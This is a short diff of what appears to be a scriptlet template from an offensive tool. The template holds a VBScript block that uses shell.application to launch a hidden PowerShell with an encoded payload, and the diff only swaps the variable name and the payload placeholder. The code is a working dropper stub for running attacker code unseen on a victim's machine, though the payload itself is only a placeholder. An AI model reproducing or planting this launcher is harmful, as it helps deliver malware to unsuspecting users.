@@ -6,9 +6,9 @@
     classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 
 <script language="VBScript">
-Dim RANDOMIZED_SHELL_NAME
-set RANDOMIZED_SHELL_NAME = CreateObject("shell.application")
-RANDOMIZED_SHELL_NAME.ShellExecute "powershell.exe", " -nop -w hidden -e RAW_DROPPER_BASE64", "", "open", 0
+Dim ad995
+set ad995 = CreateObject("shell.application")
+ad995.ShellExecute "powershell.exe", " -nop -w hidden -e TEMPLATEPAYLOAD", "", "open", 0
 </script>
 
 </registration>
